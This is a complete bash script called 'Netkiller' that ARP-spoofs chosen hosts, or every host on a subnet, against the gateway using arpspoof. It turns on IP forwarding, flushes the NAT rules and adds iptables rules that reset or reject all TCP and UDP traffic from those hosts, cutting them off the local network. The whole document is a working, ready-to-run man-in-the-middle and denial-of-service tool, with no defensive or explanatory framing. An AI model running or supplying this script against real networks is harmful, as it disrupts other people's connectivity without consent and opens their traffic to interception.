#!/bin/bash

# Check if required tools are installed
for tool in ipcalc dsniff iptables ip; do
    if ! command -v "$tool" &> /dev/null; then
        echo "$tool is not installed. Please install it (e.g., 'apt-get install $tool' or 'apt-get install dsniff' for arpspoof on Debian/Ubuntu)."
        exit 1
    fi
done

# Prompt for network interface
read -p "Enter the network interface (e.g., wlan0): " INTERFACE
if [[ -z "$INTERFACE" ]]; then
    echo "No interface provided. Exiting."
    exit 1
fi

# Get the device's IP for the specified interface
DEVICE_IP=$(ip addr show "$INTERFACE" | grep -oP 'inet \K[\d.]+' | head -n 1)
if [[ -z "$DEVICE_IP" ]]; then
    echo "Could not determine device IP for interface $INTERFACE. Exiting."
    exit 1
fi
echo "Device IP on $INTERFACE: $DEVICE_IP"

# Prompt for target IPs or subnet
read -p "Enter Multiple Target IP(s) (e.g., 10.0.0.1 10.0.0.2 10.0.0.3) or Subnet (e.g., 192.168.1.0/24) " TARGET_INPUT
if [[ -z "$TARGET_INPUT" ]]; then
    echo "No target IPs or subnet provided. Exiting."
    exit 1
fi

# Prompt for gateway IP
read -p "Enter the Gateway IP: " GATEWAY
if [[ -z "$GATEWAY" ]]; then
    echo "No gateway IP provided. Exiting."
    exit 1
fi

# Function to convert subnet to individual IPs using ipcalc
get_ips_from_subnet() {
    local subnet="$1"
    # Use ipcalc to get the host range and extract individual IPs
    local range
    range=$(ipcalc "$subnet" | grep -E 'HostMin|HostMax' | awk '{print $2}')
    if [[ -z "$range" ]]; then
        echo "Invalid subnet: $subnet"
        return 1
    fi
    # Convert range to individual IPs
    IFS=$'\n' read -d '' -r -a bounds <<< "$range"
    start_ip=${bounds[0]}
    end_ip=${bounds[1]}
    # Convert IPs to numbers for iteration
    start=$(echo "$start_ip" | awk -F. '{print ($1*256^3)+($2*256^2)+($3*256)+$4}')
    end=$(echo "$end_ip" | awk -F. '{print ($1*256^3)+($2*256^2)+($3*256)+$4}')
    for ((i=start; i<=end; i++)); do
        printf "%d.%d.%d.%d\n" $((i>>24&255)) $((i>>16&255)) $((i>>8&255)) $((i&255))
    done
}

# Process target IPs or subnets
TARGET_IPS=()
for input in $TARGET_INPUT; do
    # Check if input is a subnet (contains '/')
    if [[ "$input" =~ "/" ]]; then
        # Convert subnet to individual IPs
        while IFS= read -r ip; do
            # Skip the device IP and gateway IP
            if [[ "$ip" != "$DEVICE_IP" && "$ip" != "$GATEWAY" ]]; then
                TARGET_IPS+=("$ip")
            fi
        done < <(get_ips_from_subnet "$input")
    else
        # Assume it's a single IP, skip if it matches device IP or gateway
        if [[ "$input" != "$DEVICE_IP" && "$input" != "$GATEWAY" ]]; then
            TARGET_IPS+=("$input")
        fi
    fi
done

# Remove duplicates and sort IPs
TARGET_IPS=($(printf "%s\n" "${TARGET_IPS[@]}" | sort -u))

# Validate that we have at least one valid IP
if [ ${#TARGET_IPS[@]} -eq 0 ]; then
    echo "No valid target IPs found (or all IPs match device IP or gateway). Exiting."
    exit 1
fi

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush and reset iptables
iptables -t nat -F
iptables -t nat -X
iptables -P FORWARD ACCEPT
iptables -I FORWARD -j ACCEPT
iptables -t nat -A POSTROUTING -o "$INTERFACE" -j MASQUERADE

# Array to store PIDs of arpspoof processes
ARP_PIDS=()

# Launch ARP spoofing and iptables rules for each IP
for ip in "${TARGET_IPS[@]}"; do
echo "" 
    echo "Applying Netkiller rules for IP: $ip"
    # Start ARP spoofing (target to gateway and gateway to target)
    arpspoof -i "$INTERFACE" -t "$ip" "$GATEWAY" >/dev/null 2>&1 &
    ARP_PIDS+=($!)
    arpspoof -i "$INTERFACE" -t "$GATEWAY" "$ip" >/dev/null 2>&1 &
    ARP_PIDS+=($!)
    # Apply iptables rules
    iptables -I FORWARD -i "$INTERFACE" -s "$ip" -p tcp -j REJECT --reject-with tcp-reset
    iptables -I FORWARD -i "$INTERFACE" -s "$ip" -p udp -j REJECT --reject-with icmp-port-unreachable
done

echo ""
echo "Netkiller rules applied for ${#TARGET_IPS[@]} IPs. Press Ctrl+C to Stop."
trap 'echo "Clearing rules and stopping..."; 
      for ip in "${TARGET_IPS[@]}"; do 
          iptables -D FORWARD -i "$INTERFACE" -s "$ip" -p tcp -j REJECT --reject-with tcp-reset 2>/dev/null; 
          iptables -D FORWARD -i "$INTERFACE" -s "$ip" -p udp -j REJECT --reject-with icmp-port-unreachable 2>/dev/null; 
      done; 
      for pid in "${ARP_PIDS[@]}"; do 
          kill "$pid" 2>/dev/null; 
      done; 
      echo "Rules cleared."; 
      exit 0' SIGINT

# Keep script running until interrupted
while true; do
    sleep 1
done
